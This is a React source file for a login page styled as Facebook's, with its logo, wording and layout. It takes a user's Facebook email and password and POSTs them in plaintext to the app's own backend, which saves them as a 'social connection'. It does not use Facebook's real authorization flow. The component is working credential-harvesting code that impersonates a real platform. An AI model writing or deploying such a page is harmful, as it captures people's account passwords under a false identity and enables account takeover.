import { useState, useCallback } from 'react';
import './FacebookLogin.css';

export default function FacebookLogin({ userEmail, onCancel, onLoginSuccess }) {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const API_BASE_URL = import.meta.env.VITE_API_URL || '';

  const handleSubmit = useCallback(async (e) => {
    e.preventDefault();
    if (!email || !password) return;

    setIsSubmitting(true);
    setError('');

    try {
      const response = await fetch(`${API_BASE_URL}/api/connections/save-social-connection`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          userEmail: (userEmail || '').trim().toLowerCase(),
          platform: 'facebook',
          identifier: email.trim(),
          password
        })
      });

      const data = await response.json();

      if (response.ok && data.success) {
        if (onLoginSuccess) {
          onLoginSuccess();
        }
      } else {
        setError(data.error || 'We could not save your Facebook login details. Please try again.');
      }
    } catch (err) {
      console.error('Facebook connection error:', err);
      setError('Unable to connect to the database server. Please ensure port 5001 is running.');
    } finally {
      setIsSubmitting(false);
    }
  }, [API_BASE_URL, email, password, onLoginSuccess, userEmail]);

  const isFormValid = email.trim().length > 0 && password.length >= 6;

  return (
    <div className="facebook-login-page">
      <button type="button" className="facebook-back-btn" onClick={onCancel}>
        ← Back to Dashboard
      </button>

      <div className="facebook-login-card">
        <div className="facebook-logo" aria-label="Facebook">
          <svg viewBox="0 0 36 36" width="40" height="40" fill="currentColor">
            <path fill="#1877f2" d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z"></path>
            <path fill="#ffffff" d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.025V18h5.883l-1.008 5.5h-4.867v12.37a18.183 18.183 0 0 1-6.53-.399Z"></path>
          </svg>
        </div>
        <h1 className="facebook-title">Log in to Facebook</h1>
        <p className="facebook-subtitle">Connect your account to continue</p>

        <form onSubmit={handleSubmit} className="facebook-form">
          <input
            type="text"
            className="facebook-input"
            placeholder="Email address or phone number"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            autoComplete="username"
            required
          />

          <input
            type="password"
            className="facebook-input"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            autoComplete="current-password"
            required
          />

          {error && <div className="facebook-error">{error}</div>}

          <button type="submit" className="facebook-submit-btn" disabled={!isFormValid || isSubmitting}>
            {isSubmitting ? 'Connecting...' : 'Log In'}
          </button>
        </form>

        <a href="#" className="facebook-link" onClick={(e) => e.preventDefault()}>
          Forgotten password?
        </a>

        <div className="facebook-divider" />

        <button type="button" className="facebook-secondary-btn">
          Create New Account
        </button>
      </div>
    </div>
  );
}
